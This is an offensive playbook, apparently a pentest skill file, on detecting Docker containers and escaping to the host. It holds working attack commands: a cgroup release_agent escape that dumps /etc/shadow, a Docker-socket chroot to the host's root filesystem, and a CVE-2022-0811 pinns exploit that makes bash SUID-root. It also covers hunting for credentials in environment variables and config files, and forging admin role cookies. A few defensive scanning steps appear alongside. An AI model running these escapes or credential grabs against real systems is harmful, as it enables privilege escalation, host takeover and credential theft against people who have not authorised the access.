# Docker — Container Recon + Escape Techniques

## When this applies

- You have a shell inside a Docker container or are testing the Docker host.
- Goal: detect container, find bind mounts / privileged flags, escape to host.

## Technique

Detect containerization first (`/proc/1/cgroup`, `/.dockerenv`). Inspect mountinfo for bind mounts (host paths exposed). Check for `--privileged`, Docker socket access, `cap_sys_admin`. Use cgroup release_agent or socket pivot to escape.

## Steps

### Docker security testing

```bash
# Check Docker version
docker version

# List containers
docker ps

# Inspect container
docker inspect container_id

# Check for privileged containers
docker inspect container_id | grep -i privileged

# Check capabilities
docker inspect container_id | grep -i cap

# Check mounted volumes
docker inspect container_id | grep -A 10 Mounts

# Scan image for vulnerabilities
trivy image imagename:tag

# Check for secrets in image
docker history imagename:tag --no-trunc
docker inspect imagename:tag

# Test Docker socket exposure (from inside container)
ls -la /var/run/docker.sock
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Escape from privileged container
docker run --rm --privileged -it ubuntu bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
```

### Docker container enumeration (post-shell)

**Enumeration steps:**
1. **Detect container** — `cat /proc/1/cgroup 2>/dev/null | grep docker`, check `/.dockerenv`, or `hostname` showing container ID
2. **Bind mount discovery** — `cat /proc/1/mountinfo | grep -v '/proc\|/sys\|/dev'` reveals host paths mapped into container. Look for: cert directories, home directories, config files, flag files
3. **Credential hunt** — check env vars (`cat /proc/1/environ | tr '\0' '\n'`), mounted configs, app source code for commented creds, `.env` files, database connection strings
4. **Cookie/role manipulation** — web panels may use client-side role cookies (e.g., `UserRole=admin`) to gate admin features like file upload. Always check if setting role cookies unlocks hidden functionality
5. **Network discovery** — `cat /proc/net/fib_trie` or `ip route` to find Docker networks, gateway (usually Docker host at x.x.x.1)
6. **Docker host access** — try SSH to gateway IP with found creds. Check if Docker socket is mounted (`ls /var/run/docker.sock`)
7. **Other containers** — if Docker socket accessible: `docker ps`, `docker exec` into other containers

### Container escape techniques

```bash
# Privileged container escape — mount host filesystem via cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > /tmp/shadow' >> /cmd
chmod +x /cmd

# Docker socket escape
docker run -v /:/host -it ubuntu chroot /host

# HostPath mount exploitation
kubectl exec -it pod-name -- /bin/bash
cd /host-mount
# Access host filesystem
```

### CVE-2022-0811 — pinns sysctl splitter container escape

**One-liner from a low-priv user with the `pinns` SUID binary:**
```bash
echo '#!/bin/bash
chmod u+s /bin/bash' > /dev/shm/exp.sh && chmod +x /dev/shm/exp.sh

mkdir -p /dev/shm/exproot
pinns -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/dev/shm/exp.sh #' \
      -f exptest -d /dev/shm/exproot -U

sleep 100 & kill -SIGSEGV $!
/bin/bash -p
```

The `+` separator in the `-s` flag bypasses validation — only the first `key=value` is checked, the second silently overwrites `core_pattern`. `pinns -U` then fails with `Operation not permitted` *but the sysctl write has already happened*. SIGSEGV-ing any process triggers the new `core_pattern` (a pipe to our SUID-creating script). The pipe handler runs as root, leaving SUID-root `/bin/bash`.

### Common Docker vulnerabilities

- **Privileged Containers**: Running with `--privileged`
- **Docker Socket Exposure**: Mounting `/var/run/docker.sock`
- **Vulnerable Images**: Outdated base images
- **Secrets in Images**: Hardcoded credentials
- **Host Namespace Sharing**: `--pid=host`, `--net=host`
- **Insecure Registries**: Unencrypted/unauthenticated

## Verifying success

- `/proc/1/cgroup` shows `docker` or `kubepods` — confirmed container.
- Bind mounts list reveals writable host paths (`/etc`, `/root/.ssh`, `/var/run/docker.sock`).
- Escape: `chroot /host` provides interactive root shell on host.

## Common pitfalls

- `/.dockerenv` may not exist on minimal containers — use `/proc/1/cgroup` instead.
- Docker socket may require group membership (`docker` group) — check `getent group docker`.
- Privileged-container escape via cgroup requires kernel support — modern kernels may block.

## Tools

- docker CLI
- trivy (image vulnerability scanner)
- Anchore, Grype
- DeepCE (privileged-container exploit toolkit)
